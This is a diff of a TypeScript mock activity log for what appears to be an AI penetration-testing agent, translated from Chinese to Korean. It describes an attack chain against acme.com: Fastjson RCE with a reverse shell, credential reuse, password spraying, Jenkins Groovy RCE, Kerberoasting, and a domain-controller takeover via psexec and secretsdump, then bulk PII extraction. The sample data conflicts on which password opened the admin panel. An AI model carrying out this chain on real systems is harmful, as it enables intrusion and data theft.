+      "graph_overview: 목표 계층에서 goals를 이미 분해했습니다. g1 「acme.com 관리자 권한 확보」와 g2 「사용자의 민감한 데이터 읽기」는 모두 open입니다. facts=0이고 recent_facts도 비어 있습니다(그래프가 거의 비어 있고 워커 산출물도 없음). 범위 내 자산은 루트 도메인 acme.com과 C 클래스 대역 하나뿐입니다. 초기 공격 표면은 www / admin / api / shop / vpn의 다섯 진입점으로 판단합니다. 그래프에 fact가 없으므로 【극히 가벼운 읽기 전용 탐지】만 수행하여 초기 의도를 구체화하고 plan 단계에서 실행자의 일을 대신하지 않습니다.",
   },
   {
     seq: 1002,
@@ -1315,7 +1315,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "p0-probe",
     summary: "curl -sI https://acme.com; curl -sI https://admin.acme.com",
-    detail: "开局态势几乎空白，做 ≤3 次只读探测校准初始意图方向（不做枚举/验证，那是 worker 的活）。",
+    detail: "초기 상황이 거의 비어 있으므로 읽기 전용 탐지를 3회 이하 수행하여 초기 의도 방향을 조정합니다(열거/검증은 워커의 일이므로 수행하지 않음).",
   },
   {
     seq: 1003,
@@ -1325,8 +1325,8 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "p0-probe",
     summary:
-      "acme.com → 302 → www；Server: nginx/1.24.0\nadmin.acme.com → 200，X-Powered-By 缺省，body 命中 element-ui/vue 特征",
-    detail: "admin 是独立后台登录页；确认五入口有效，可把初始意图描述写精准。",
+      "acme.com → 302 → www; Server: nginx/1.24.0\nadmin.acme.com → 200, X-Powered-By 없음, body에서 element-ui/vue 특징 확인",
+    detail: "admin은 독립 관리자 로그인 페이지입니다. 다섯 진입점이 유효함을 확인하여 초기 의도를 정확하게 기술할 수 있습니다.",
   },
   {
     seq: 1004,
@@ -1335,9 +1335,9 @@ export const activity: Activity[] = [
     kind: "tool_use",
     tool: "add_intent",
     tool_use_id: "p0-ai",
-    summary: "add_intent × 4（批量派首批探索方向）",
+    summary: "add_intent × 4(첫 탐색 방향 일괄 배정)",
     detail:
-      "intents=[\n  { summary: 'acme.com 全量子域枚举 + 存活主机端口/服务识别，摸清攻击面', asset_ids: [acme.com], priority: 6 },\n  { summary: 'admin.acme.com 后台默认口令/弱口令测试（Element-UI 登录，无验证码）', asset_ids: [admin], priority: 9 },\n  { summary: 'www.acme.com/search q 参数 SQL 注入探测', asset_ids: [www], priority: 8 },\n  { summary: 'api.acme.com 订单接口越权(IDOR)测试', asset_ids: [api], priority: 8 },\n]\nparent_ids 均空（顶层全新方向，兜底连 origin fact）。",
+      "intents=[\n  { summary: 'acme.com 전체 하위 도메인 열거 + 활성 호스트의 포트/서비스 식별로 공격 표면 파악', asset_ids: [acme.com], priority: 6 },\n  { summary: 'admin.acme.com 관리자 기본/약한 비밀번호 테스트(Element-UI 로그인, CAPTCHA 없음)', asset_ids: [admin], priority: 9 },\n  { summary: 'www.acme.com/search q 매개변수 SQL 인젝션 탐지', asset_ids: [www], priority: 8 },\n  { summary: 'api.acme.com 주문 인터페이스 권한 우회(IDOR) 테스트', asset_ids: [api], priority: 8 },\n]\nparent_ids는 모두 비어 있음(최상위의 새로운 방향으로, 기본적으로 origin fact에 연결).",
   },
   {
     seq: 1005,
@@ -1346,8 +1346,8 @@ export const activity: Activity[] = [
     kind: "tool_result",
     tool: "add_intent",
     tool_use_id: "p0-ai",
-    summary: "4 intents created → ids=[i1, i2, i4, i5]，已连入 frontier",
-    detail: "刻意保持路线多样：i1 侦察 + i2（g1 认证路线）+ i4/i5（g2 数据路线），2 条独立机理并行，不过早收敛。",
+    summary: "4 intents created → ids=[i1, i2, i4, i5], frontier에 연결됨",
+    detail: "경로를 의도적으로 다양하게 유지합니다. i1 정찰 + i2(g1 인증 경로) + i4/i5(g2 데이터 경로). 독립된 두 메커니즘을 병렬로 진행하며 너무 일찍 수렴하지 않습니다.",
   },
   {
     seq: 1006,
@@ -1355,18 +1355,18 @@ export const activity: Activity[] = [
     ts: T("2026-07-24T09:13:05Z"),
     kind: "text",
     summary:
-      "本轮派生首批 4 条意图：i1 资产侦察、i2 后台口令、i4 注入、i5 API 越权。g1 走 i2、g2 走 i4/i5，双目标各有独立入口在推进。等 worker 产出事实后再据血缘加码。",
+      "이번 턴에서 첫 의도 4개를 배정했습니다. i1 자산 정찰, i2 관리자 비밀번호, i4 인젝션, i5 API 권한 우회입니다. g1은 i2, g2는 i4/i5로 진행하므로 두 목표 모두 독립된 진입점이 있습니다. 워커가 사실을 생성하면 그 계보를 바탕으로 확대합니다.",
   },
 
   // ── 第 1 轮 · 攻击面加码（2026-07-25 14:12）──
-  { seq: 1100, worker: "planner", ts: T("2026-07-25T14:12:00Z"), kind: "round", summary: "第 1 轮 · 攻击面加码" },
+  { seq: 1100, worker: "planner", ts: T("2026-07-25T14:12:00Z"), kind: "round", summary: "1번째 턴 · 공격 표면 확대" },
   {
     seq: 1101,
     worker: "planner",
     ts: T("2026-07-25T14:12:15Z"),
     kind: "thinking",
     summary:
-      "对照 recent_facts：workG 交回 faGit「.git 可下载，git-dumper 还原出后端源码」与 faCreds「config.php 硬编码 sa/Acme@2021（疑似内网通用）」；work#6 指纹交回 fa3「shop 命中 Fastjson 1.2.24（存在已知反序列化 RCE）」。两条【材料性新机理】：① 硬编码 DB 口令可能横跨内网复用；② Fastjson 有成熟 RCE 打法。这打开一条与现有认证/注入路线【本质不同】的入口——从 shop 直接 RCE 突破进 DMZ。先拉 faGit 详情核实产物。",
+      "recent_facts 대조: workG가 faGit 「.git 다운로드 및 git-dumper로 백엔드 소스 복원」과 faCreds 「config.php에 sa/Acme@2021 하드코딩(내부망 공용으로 추정)」를 반환했습니다. work#6의 지문 분석은 fa3 「shop이 Fastjson 1.2.24와 일치(알려진 역직렬화 RCE 존재)」를 반환했습니다. 두 가지 【실질적인 새 메커니즘】입니다. ① 하드코딩된 DB 비밀번호를 내부망에서도 재사용할 가능성, ② 알려진 Fastjson RCE 방법. 기존 인증/인젝션 경로와 【본질적으로 다른】 진입점인 shop의 직접 RCE를 통해 DMZ로 진입할 수 있습니다. 먼저 faGit 상세 정보를 가져와 산출물을 확인합니다.",
   },
   {
     seq: 1102,
@@ -1375,8 +1375,8 @@ export const activity: Activity[] = [
     kind: "tool_use",
     tool: "node_detail",
     tool_use_id: "p1-nd",
-    summary: "node_detail(faGit) —— 核对 workG 的源码还原产物",
-    detail: "add_intent 前先看 worker 到底还原出什么，避免凭指纹臆测方向。",
+    summary: "node_detail(faGit) — workG의 소스 복원 산출물 확인",
+    detail: "add_intent 전에 워커가 실제로 복원한 내용을 확인하여 지문만으로 방향을 추측하지 않습니다.",
   },
   {
     seq: 1103,
@@ -1386,8 +1386,8 @@ export const activity: Activity[] = [
     tool: "node_detail",
     tool_use_id: "p1-nd",
     summary:
-      "faGit 证据：git-dumper 还原出 config.php / db.php / order_api.php；config.php 内 $db=['host'=>'10.10.10.5','user'=>'sa','pass'=>'Acme@2021']",
-    detail: "硬编码指向内网 10.10.10.5(FS01)，佐证 faCreds 的「内网通用」推断——RCE 落地后这组口令值得复用。",
+      "faGit 증거: git-dumper로 config.php / db.php / order_api.php 복원. config.php에 $db=['host'=>'10.10.10.5','user'=>'sa','pass'=>'Acme@2021'] 포함",
+    detail: "하드코딩된 주소가 내부망 10.10.10.5(FS01)를 가리켜 faCreds의 「내부망 공용」 추정을 뒷받침합니다. RCE 확보 후 이 비밀번호를 재사용할 가치가 있습니다.",
   },
   {
     seq: 1104,
@@ -1396,9 +1396,9 @@ export const activity: Activity[] = [
     kind: "tool_use",
     tool: "add_intent",
     tool_use_id: "p1-ai",
-    summary: "add_intent × 2（Fastjson 突破链，串行分步先派可执行一步）",
+    summary: "add_intent × 2(Fastjson 진입 경로, 순차 단계에서 현재 실행 가능한 단계부터 배정)",
     detail:
-      "intents=[\n  { summary: 'shop.acme.com 组件指纹深挖 + Fastjson 1.2.24 CVE 精确关联(确认 gadget 链)', asset_ids: [shop], parent_ids: [fa3], priority: 7 },\n  { summary: '构造 Fastjson 反序列化 payload 触发 shop RCE，获取反弹 shell', asset_ids: [shop], parent_ids: [fa3], priority: 9 },\n]\n注：这是强依赖串行链，已 TodoWrite 记『指纹→RCE→立足点提权』三步，本轮只派前两步（提权依赖 shell 产出，下轮再派）。",
+      "intents=[\n  { summary: 'shop.acme.com 구성 요소 지문 심층 분석 + Fastjson 1.2.24 CVE 정확히 연결(gadget 체인 확인)', asset_ids: [shop], parent_ids: [fa3], priority: 7 },\n  { summary: 'Fastjson 역직렬화 페이로드를 구성하여 shop RCE를 유발하고 리버스 셸 확보', asset_ids: [shop], parent_ids: [fa3], priority: 9 },\n]\n참고: 강한 의존성이 있는 순차 경로입니다. TodoWrite에 「지문→RCE→거점 권한 상승」 세 단계를 기록했으며 이번 턴은 앞의 두 단계만 배정합니다(권한 상승은 셸 산출물에 의존하므로 다음 턴에 배정).",
   },
   {
     seq: 1105,
@@ -1407,7 +1407,7 @@ export const activity: Activity[] = [
     kind: "tool_result",
     tool: "add_intent",
     tool_use_id: "p1-ai",
-    summary: "2 intents created → ids=[i6, i7]，已由 fa3 连入血缘",
+    summary: "2 intents created → ids=[i6, i7], fa3에서 계보에 연결됨",
   },
   {
     seq: 1106,
@@ -1415,7 +1415,7 @@ export const activity: Activity[] = [
     ts: T("2026-07-25T14:13:00Z"),
     kind: "text",
     summary:
-      "态势升级：源码 + 硬编码内网口令 + Fastjson RCE 构成一条全新突破路线。已请目标层登记 g3「从外网突破 DMZ，建立内网立足点」，派 i6（指纹/CVE 关联）、i7（触发 RCE）。DMZ 提权一步依赖 shell，记入待办下轮派。",
+      "상황 확대: 소스 코드 + 하드코딩된 내부망 비밀번호 + Fastjson RCE가 새로운 진입 경로를 구성합니다. 목표 계층에 g3 「외부망에서 DMZ를 통과하여 내부망 거점 확보」 등록을 요청하고 i6(지문/CVE 연결), i7(RCE 유발)을 배정했습니다. DMZ 권한 상승은 셸에 의존하므로 할 일에 기록하여 다음 턴에 배정합니다.",
   },
 
   // ── 第 2 轮 · 立足点已建，转内网（2026-07-25 20:25）──
@@ -1424,7 +1424,7 @@ export const activity: Activity[] = [
     worker: "planner",
     ts: T("2026-07-25T20:25:00Z"),
     kind: "round",
-    summary: "第 2 轮 · 立足点已建，转内网",
+    summary: "2번째 턴 · 거점 확보, 내부망으로 전환",
   },
   {
     seq: 1201,
@@ -1432,7 +1432,7 @@ export const activity: Activity[] = [
     ts: T("2026-07-25T20:25:18Z"),
     kind: "thinking",
     summary:
-      "对照血缘：i7 交回 fa4「反弹 shell www-data@dmz-web01(10.0.20.15)，位于 DMZ 段」；提权链交回 fa5「sudo -l 命中 NOPASSWD python3 → 可提权 root」、fa6「立足点第二网卡直连内网 10.10.10.0/24」。g3 的验收条件（突破 DMZ + 建立足点）已被 fa4+fa6 直接满足。先核实 fa6 的内网可达性再 prove_goal。",
+      "계보 대조: i7이 fa4 「DMZ 대역의 리버스 셸 www-data@dmz-web01(10.0.20.15)」를 반환했습니다. 권한 상승 경로는 fa5 「sudo -l의 NOPASSWD python3 → root 권한 상승 가능」와 fa6 「거점의 두 번째 네트워크 인터페이스가 내부망 10.10.10.0/24에 직접 연결」을 반환했습니다. g3의 달성 기준(DMZ 진입 + 거점 확보)은 fa4+fa6로 직접 충족되었습니다. fa6의 내부망 접근성을 먼저 확인한 뒤 prove_goal을 호출합니다.",
   },
   {
     seq: 1202,
@@ -1441,7 +1441,7 @@ export const activity: Activity[] = [
     kind: "tool_use",
     tool: "node_detail",
     tool_use_id: "p2-nd",
-    summary: "node_detail(fa6) —— 确认双网卡与内网可达",
+    summary: "node_detail(fa6) — 이중 네트워크 인터페이스와 내부망 접근 확인",
   },
   {
     seq: 1203,
@@ -1450,7 +1450,7 @@ export const activity: Activity[] = [
     kind: "tool_result",
     tool: "node_detail",
     tool_use_id: "p2-nd",
-    summary: "fa6 证据：ip a → eth0 10.0.20.15(DMZ) / eth1 10.10.10.15(内网)；ping 10.10.10.10 通，跨越 DMZ 边界成立",
+    summary: "fa6 증거: ip a → eth0 10.0.20.15(DMZ) / eth1 10.10.10.15(내부망). ping 10.10.10.10 성공으로 DMZ 경계 통과 확인",
   },
   {
     seq: 1204,
@@ -1461,7 +1461,7 @@ export const activity: Activity[] = [
     tool_use_id: "p2-pg",
     summary: "prove_goal(g3, evidence=fa6)",
     detail:
-      "reason：i7 RCE 拿到 DMZ 立足点(fa4)、fa5 提权 root、fa6 证明第二网卡直连内网并 ping 通 DC01——『突破 DMZ 建立内网立足点』验收达成。",
+      "reason: i7 RCE로 DMZ 거점을 확보(fa4), fa5에서 root 권한 상승, fa6에서 두 번째 네트워크 인터페이스의 내부망 직접 연결과 DC01 ping 성공 입증 — 「DMZ를 통과하여 내부망 거점 확보」 기준 달성.",
   },
   {
     seq: 1205,
@@ -1470,7 +1470,7 @@ export const activity: Activity[] = [
     kind: "tool_result",
     tool: "prove_goal",
     tool_use_id: "p2-pg",
-    summary: "goal g3 → met（证据 fa6 已连入）；仍有 g1/g2/g4 未达成，任务继续",
+    summary: "goal g3 → met(증거 fa6 연결됨). g1/g2/g4는 아직 미달성이므로 작업 계속",
   },
   {
     seq: 1206,
@@ -1479,9 +1479,9 @@ export const activity: Activity[] = [
     kind: "tool_use",
     tool: "add_intent",
     tool_use_id: "p2-ai",
-    summary: "add_intent × 4（以立足点为 pivot 展开内网横向）",
+    summary: "add_intent × 4(거점을 경유하여 내부망 수평 이동)",
     detail:
-      "intents=[\n  { summary: '以 dmz-web01 为 pivot 做内网 10.10.10.0/24 主机发现与端口识别', asset_ids: [dmz-web01], parent_ids: [fa6], priority: 8 },\n  { summary: '内网横向：复用硬编码口令 sa/Acme@2021 做凭据复用与密码喷洒', parent_ids: [faCreds], priority: 8 },\n  { summary: '内部 Jenkins(10.10.10.20) 未授权 /script Groovy 执行(RCE)', parent_ids: [fa6], priority: 9 },\n  { summary: '对域服务账号做 Kerberoasting 并离线破解', parent_ids: [fa6], priority: 8 },\n]\n主机发现是前置(先派)，其余三条是并行的横向探索维度。",
+      "intents=[\n  { summary: 'dmz-web01을 경유하여 내부망 10.10.10.0/24 호스트 탐색 및 포트 식별', asset_ids: [dmz-web01], parent_ids: [fa6], priority: 8 },\n  { summary: '내부망 수평 이동: 하드코딩된 sa/Acme@2021 자격 증명 재사용 및 비밀번호 스프레이', parent_ids: [faCreds], priority: 8 },\n  { summary: '내부 Jenkins(10.10.10.20)의 인증 없는 /script Groovy 실행(RCE)', parent_ids: [fa6], priority: 9 },\n  { summary: '도메인 서비스 계정 Kerberoasting 및 오프라인 해독', parent_ids: [fa6], priority: 8 },\n]\n호스트 탐색은 선행 단계로 먼저 배정하고 나머지 세 항목은 병렬 수평 이동 탐색 방향입니다.",
   },
   {
     seq: 1207,
@@ -1498,18 +1498,18 @@ export const activity: Activity[] = [
     ts: T("2026-07-25T20:26:20Z"),
     kind: "text",
     summary:
-      "g3 达成，攻击面从外网转入内网。已请登记 g4「内网横向，拿下内部靶标域控 DC01」，派 i9（主机发现）+ i10/i11/i12 三条并行横向。凭据复用直接锚在 faCreds 上——外网源码泄露的口令喂给内网横向。",
+      "g3을 달성하여 공격 표면이 외부망에서 내부망으로 전환되었습니다. g4 「내부망 수평 이동으로 내부 테스트 대상 DC01 확보」 등록을 요청하고 i9(호스트 탐색) + i10/i11/i12의 세 병렬 수평 이동 경로를 배정했습니다. 자격 증명 재사용은 faCreds에 직접 연결하여 외부 소스 노출 비밀번호를 내부망 수평 이동에 활용합니다.",
   },
 
   // ── 第 3 轮 · 靶标达成复盘（2026-07-26 00:25）──
-  { seq: 1300, worker: "planner", ts: T("2026-07-26T00:25:00Z"), kind: "round", summary: "第 3 轮 · 靶标达成复盘" },
+  { seq: 1300, worker: "planner", ts: T("2026-07-26T00:25:00Z"), kind: "round", summary: "3번째 턴 · 목표 달성 검토" },
   {
     seq: 1301,
     worker: "planner",
     ts: T("2026-07-26T00:25:16Z"),
     kind: "thinking",
     summary:
-      "对照本轮 worker 产出：i9→fa7「内网存活 DC01/FS01/JENKINS」；i11→fa8「Jenkins /script 无鉴权 Groovy」+ fa9「从 Jenkins 凭据库导出 acme\\svc_deploy 明文口令」；i12→fa10「Kerberoast svc_sql TGS，hashcat 破出 Sql@2020」。svc_deploy 属 Domain Admins，i13 已用其 psexec 拿下 DC01 并 secretsdump。g4 验收（拿下 DC01）应已达成，先核对 finding 证据链再盖章。",
+      "이번 워커 산출물 대조: i9→fa7 「내부망 활성 DC01/FS01/JENKINS」, i11→fa8 「Jenkins /script 인증 없는 Groovy」 + fa9 「Jenkins 자격 증명 저장소에서 acme\\svc_deploy 평문 비밀번호 추출」, i12→fa10 「svc_sql TGS Kerberoasting, hashcat으로 Sql@2020 해독」. svc_deploy는 Domain Admins에 속하며 i13이 이미 psexec로 DC01을 확보하고 secretsdump를 수행했습니다. g4 기준(DC01 확보)이 충족되었을 것으로 보이며, 먼저 finding 증거 경로를 확인한 뒤 확정합니다.",
   },
   {
     seq: 1302,
@@ -1518,7 +1518,7 @@ export const activity: Activity[] = [
     kind: "tool_use",
     tool: "list_findings",
     tool_use_id: "p3-lf",
-    summary: "list_findings —— 核对 DC01 沦陷的确认证据",
+    summary: "list_findings — DC01 침해의 확정 증거 대조",
   },
   {
     seq: 1303,
@@ -1528,7 +1528,7 @@ export const activity: Activity[] = [
     tool: "list_findings",
     tool_use_id: "p3-lf",
     summary:
-      "F-09「域控 DC01 完全控制 / secretsdump 导出全域哈希」critical（证据：psexec svc_deploy@10.10.10.10 + NTDS.dit dump）；上游链 fa9→fa10→i13 完整",
+      "F-09 「도메인 컨트롤러 DC01 완전 제어 / secretsdump로 전체 도메인 해시 추출」 critical(증거: psexec svc_deploy@10.10.10.10 + NTDS.dit dump). 상위 경로 fa9→fa10→i13 완전함",
   },
   {
     seq: 1304,
@@ -1539,7 +1539,7 @@ export const activity: Activity[] = [
     tool_use_id: "p3-pg",
     summary: "prove_goal(g4, evidence=F-09)",
     detail:
-      "reason：Jenkins 泄露 svc_deploy(Domain Admin) → psexec 控制 DC01 → secretsdump 全域哈希，F-09 已确认，『拿下内部靶标域控 DC01』达成。",
+      "reason: Jenkins에서 svc_deploy(Domain Admin) 노출 → psexec로 DC01 제어 → secretsdump로 전체 도메인 해시 추출. F-09가 확인되어 「내부 테스트 대상 DC01 확보」 달성.",
   },
   {
     seq: 1305,
@@ -1548,7 +1548,7 @@ export const activity: Activity[] = [
     kind: "tool_result",
     tool: "prove_goal",
     tool_use_id: "p3-pg",
-    summary: "goal g4 → met；系统提示：g2 仍 open，非最后一个目标，任务未整体收官",
+    summary: "goal g4 → met. 시스템 알림: g2가 여전히 open이므로 마지막 목표가 아니며 전체 작업은 아직 종료되지 않음",
   },
   {
     seq: 1306,
@@ -1556,7 +1556,7 @@ export const activity: Activity[] = [
     ts: T("2026-07-26T00:26:10Z"),
     kind: "text",
     summary:
-      "g4 收官，内外网链路完全打通（外网 RCE → DMZ → 内网 → 域控）。逐一比对未覆盖方向：g2「读取用户敏感数据」仍缺临门一脚，但现有 i3（后台用户接口）+ i5（API IDOR）已覆盖该方向、且都在 running。本轮无【本质不同的未覆盖新方向】——按克制原则 0 新意图，等 i3/i5 产出。",
+      "g4를 완료하여 외부망과 내부망 경로를 모두 연결했습니다(외부망 RCE → DMZ → 내부망 → 도메인 컨트롤러). 미검증 방향을 하나씩 대조하면 g2 「사용자의 민감한 데이터 읽기」는 마지막 단계가 남아 있지만, 기존 i3(관리자 사용자 인터페이스) + i5(API IDOR)가 그 방향을 다루고 있으며 모두 running입니다. 이번 턴에는 【본질적으로 다른 미검증 새 방향】이 없으므로 절제 원칙에 따라 새 의도를 0개 배정하고 i3/i5의 결과를 기다립니다.",
   },
 
   // ── 第 4 轮 · 后台达成，收敛 g2（2026-07-26 03:55）──
@@ -1565,7 +1565,7 @@ export const activity: Activity[] = [
     worker: "planner",
     ts: T("2026-07-26T03:55:00Z"),
     kind: "round",
-    summary: "第 4 轮 · 后台达成，收敛 g2",
+    summary: "4번째 턴 · 관리자 목표 달성, g2에 집중",
   },
   {
     seq: 1401,
@@ -1573,7 +1573,7 @@ export const activity: Activity[] = [
     ts: T("2026-07-26T03:55:14Z"),
     kind: "thinking",
     summary:
-      "对照 recent_facts：work#2 用 faCreds 里的 Acme@2021 命中 admin 后台（i2 done），后台管理权限到手——g1 验收达成，先 prove_goal 盖章。随后做【量化验收核对】：g2「读取用户敏感数据」当前只有 i3/i5 摸到接口面、尚未真正取到批量数据，实测未达标，【禁止】prove_goal，改为提优先级补足取数意图。",
+      "recent_facts 대조: work#2가 faCreds의 Acme@2021로 admin 관리자 시스템에 로그인하여 i2가 done이 되었고 관리자 권한을 확보했습니다. g1 기준이 충족되었으므로 먼저 prove_goal로 확정합니다. 이어서 【정량적 달성 기준 대조】를 수행합니다. g2 「사용자의 민감한 데이터 읽기」는 i3/i5가 인터페이스를 찾았을 뿐 실제 대량 데이터는 아직 확보하지 못해 실측 기준에 미달합니다. prove_goal은 【금지】하며 우선순위를 높여 데이터 수집 의도를 보완합니다.",
   },
   {
     seq: 1402,
@@ -1584,7 +1584,7 @@ export const activity: Activity[] = [
     tool_use_id: "p4-pg",
     summary: "prove_goal(g1, evidence=fa1)",
     detail:
-      "reason：i2 用外网泄露的硬编码口令 Acme@2021 成功登入 admin 后台（Element-UI），获取后台管理权限，g1 达成。",
+      "reason: i2가 외부에서 노출된 하드코딩 비밀번호 Acme@2021로 admin 관리자 시스템(Element-UI)에 로그인하여 관리자 권한을 확보했으므로 g1 달성.",
   },
   {
     seq: 1403,
@@ -1593,7 +1593,7 @@ export const activity: Activity[] = [
     kind: "tool_result",
     tool: "prove_goal",
     tool_use_id: "p4-pg",
-    summary: "goal g1 → met；剩余未达成：g2",
+    summary: "goal g1 → met. 남은 미달성 목표: g2",
   },
   {
     seq: 1404,
@@ -1601,7 +1601,7 @@ export const activity: Activity[] = [
     ts: T("2026-07-26T03:55:40Z"),
     kind: "thinking",
     summary:
-      "g2 量化核对：目标要求『读取用户敏感数据』=实际拿到批量用户记录。graph_overview 里 findings 尚无『成功导出用户数据』条目，i3/i5 均 running 未回取数结果——实测未达标。严禁以『后台已进、大体达成』提前标 met，继续派意图补足差距。",
+      "g2 정량 대조: 「사용자의 민감한 데이터 읽기」는 실제로 다수의 사용자 기록을 확보하는 것을 의미합니다. graph_overview의 findings에 「사용자 데이터 내보내기 성공」 항목이 없고 i3/i5 모두 running이며 데이터 확보 결과를 반환하지 않아 실측 기준에 미달합니다. 「관리자 시스템에 들어갔으니 대체로 달성」했다는 이유로 미리 met로 표시하는 것은 엄격히 금지합니다. 부족한 부분을 보완하도록 의도를 계속 배정합니다.",
   },
   {
     seq: 1405,
@@ -1610,9 +1610,9 @@ export const activity: Activity[] = [
     kind: "tool_use",
     tool: "add_intent",
     tool_use_id: "p4-ai",
-    summary: "add_intent × 2（收敛 g2 取数，提高优先级）",
+    summary: "add_intent × 2(g2 데이터 확보에 집중하고 우선순위 상승)",
     detail:
-      "intents=[\n  { summary: '已登入 admin 后台，枚举用户管理/导出接口并批量拉取用户敏感字段', asset_ids: [admin], parent_ids: [fa1], priority: 9 },\n  { summary: 'api.acme.com 订单 IDOR 遍历 order_id 批量拉取用户订单/PII', asset_ids: [api], parent_ids: [fa2], priority: 9 },\n]\n注：i3/i5 已在 running，本轮以更精准的取数描述 + 提优先级(→9)加码，不重复派同义意图。",
+      "intents=[\n  { summary: 'admin 관리자 시스템 로그인 상태에서 사용자 관리/내보내기 인터페이스를 열거하고 민감한 사용자 필드를 일괄 수집', asset_ids: [admin], parent_ids: [fa1], priority: 9 },\n  { summary: 'api.acme.com 주문 IDOR로 order_id를 순회하여 사용자 주문/PII 일괄 수집', asset_ids: [api], parent_ids: [fa2], priority: 9 },\n]\n참고: i3/i5가 이미 running이므로 이번 턴은 데이터 확보 설명을 구체화하고 우선순위를 9로 높이며 동일한 의미의 의도를 중복 배정하지 않습니다.",
   },
   {
     seq: 1406,
@@ -1621,7 +1621,7 @@ export const activity: Activity[] = [
     kind: "tool_result",
     tool: "add_intent",
     tool_use_id: "p4-ai",
-    summary: "2 intents updated → ids=[i3, i5]（优先级升至 9，描述细化为『批量取数』）",
+    summary: "2 intents updated → ids=[i3, i5](우선순위 9로 상승, 설명을 「일괄 데이터 확보」로 구체화)",
   },
   {
     seq: 1407,
@@ -1629,7 +1629,7 @@ export const activity: Activity[] = [
     ts: T("2026-07-26T03:55:58Z"),
     kind: "text",
     summary:
-      "g1 达成（4/4 里已 met 3 个：g1/g3/g4）。g2 严守量化验收——只进后台不算，必须拿到批量用户数据才盖章；已把 i3/i5 提到 priority 9 并细化为取数意图，等 worker 回传即可收官整个任务。",
+      "g1 달성(전체 4개 중 g1/g3/g4의 3개가 met). g2는 정량 기준을 엄격히 지킵니다. 관리자 시스템에 진입한 것만으로는 부족하며 다수의 사용자 데이터를 실제로 확보해야 확정합니다. i3/i5의 priority를 9로 높이고 데이터 확보 의도로 구체화했으므로 워커 결과가 도착하면 전체 작업을 마무리할 수 있습니다.",
   },
 
   // work#1 · i1 子域枚举与端口扫描（done）
@@ -1639,7 +1639,7 @@ export const activity: Activity[] = [
     intent_id: "i1",
     ts: T("2026-07-24T09:20:00Z"),
     kind: "thinking",
-    summary: "先被动侦察子域，再对存活主机做端口/服务识别。",
+    summary: "먼저 하위 도메인을 수동적 방식으로 정찰하고 활성 호스트의 포트/서비스를 식별합니다.",
   },
   {
     seq: 11,
@@ -1660,8 +1660,8 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t11",
     summary:
-      "www.acme.com [200] Acme Corp\nadmin.acme.com [200] Acme Admin 登录\napi.acme.com [401]\nshop.acme.com [200]\nvpn.acme.com [200]",
-    detail: "5 个存活子域，其中 admin 是后台登录页。",
+      "www.acme.com [200] Acme Corp\nadmin.acme.com [200] Acme Admin 로그인\napi.acme.com [401]\nshop.acme.com [200]\nvpn.acme.com [200]",
+    detail: "활성 하위 도메인은 5개이며 admin은 관리자 로그인 페이지입니다.",
   },
   {
     seq: 13,
@@ -1682,7 +1682,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t12",
     summary: "22/tcp ssh OpenSSH 8.9p1\n80/tcp http nginx 1.24.0\n443/tcp https nginx 1.24.0",
-    detail: "开放 22/80/443。",
+    detail: "22/80/443 포트가 열려 있습니다.",
   },
   {
     seq: 15,
@@ -1692,7 +1692,7 @@ export const activity: Activity[] = [
     kind: "tool_use",
     tool: "upsert_asset",
     tool_use_id: "t13",
-    summary: "upsert_asset × 6（子域+服务）",
+    summary: "upsert_asset × 6(하위 도메인+서비스)",
   },
   {
     seq: 16,
@@ -1710,7 +1710,7 @@ export const activity: Activity[] = [
     intent_id: "i1",
     ts: T("2026-07-24T09:40:00Z"),
     kind: "result",
-    summary: "资产侦察完成，发现后台 admin.acme.com，交回图。",
+    summary: "자산 정찰을 완료하고 관리자 페이지 admin.acme.com을 발견하여 그래프에 기록했습니다.",
     input_tokens: 96000,
     output_tokens: 6100,
     cache_read_tokens: 61000,
@@ -1724,7 +1724,7 @@ export const activity: Activity[] = [
     intent_id: "i2",
     ts: T("2026-07-26T03:31:00Z"),
     kind: "thinking",
-    summary: "后台是 Element-UI，登录接口无验证码、无速率限制。先试默认口令表，再上字典。",
+    summary: "관리자 시스템은 Element-UI이며 로그인 인터페이스에 CAPTCHA와 요청 속도 제한이 없습니다. 먼저 기본 비밀번호 목록을 시도하고 이후 사전을 사용합니다.",
   },
   {
     seq: 21,
@@ -1745,7 +1745,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t21",
     summary: "401",
-    detail: "admin/admin 失败。",
+    detail: "admin/admin 실패.",
   },
   {
     seq: 23,
@@ -1766,7 +1766,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t22",
     summary: "HTTP/1.1 302 Found\nSet-Cookie: session=eyJ…; HttpOnly\nLocation: /dashboard",
-    detail: "admin/admin123 登录成功，拿到会话 cookie。",
+    detail: "admin/admin123 로그인에 성공하여 세션 쿠키 확보.",
   },
   {
     seq: 25,
@@ -1786,8 +1786,8 @@ export const activity: Activity[] = [
     kind: "tool_result",
     tool: "bash",
     tool_use_id: "t23",
-    summary: "<title>Acme Admin · 控制台",
-    detail: "确认已进入后台控制台。",
+    summary: "<title>Acme Admin · 콘솔",
+    detail: "관리자 콘솔 진입을 확인했습니다.",
   },
   {
     seq: 27,
@@ -1807,7 +1807,7 @@ export const activity: Activity[] = [
     kind: "tool_result",
     tool: "report_finding",
     tool_use_id: "t24",
-    summary: "finding f-6 已记录，并连到目标 g1（proves）",
+    summary: "finding f-6을 기록하고 목표 g1에 연결했습니다(proves)",
   },
   {
     seq: 29,
@@ -1815,7 +1815,7 @@ export const activity: Activity[] = [
     intent_id: "i2",
     ts: T("2026-07-26T03:50:00Z"),
     kind: "result",
-    summary: "后台默认口令确认，目标①达成。",
+    summary: "관리자 기본 비밀번호를 확인하여 목표 ①을 달성했습니다.",
     input_tokens: 72000,
     output_tokens: 4800,
     cache_read_tokens: 48000,
@@ -1829,7 +1829,7 @@ export const activity: Activity[] = [
     intent_id: "i4",
     ts: T("2026-07-25T22:01:00Z"),
     kind: "thinking",
-    summary: "search?q= 结果页把 q 拼进标题，先手工加单引号看报错。",
+    summary: "search?q= 결과 페이지는 q를 제목에 결합합니다. 먼저 작은따옴표를 수동으로 추가하여 오류를 확인합니다.",
   },
   {
     seq: 41,
@@ -1850,7 +1850,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t41",
     summary: "Unclosed quotation mark ... near '1'.",
-    detail: "MSSQL 报错型注入迹象。",
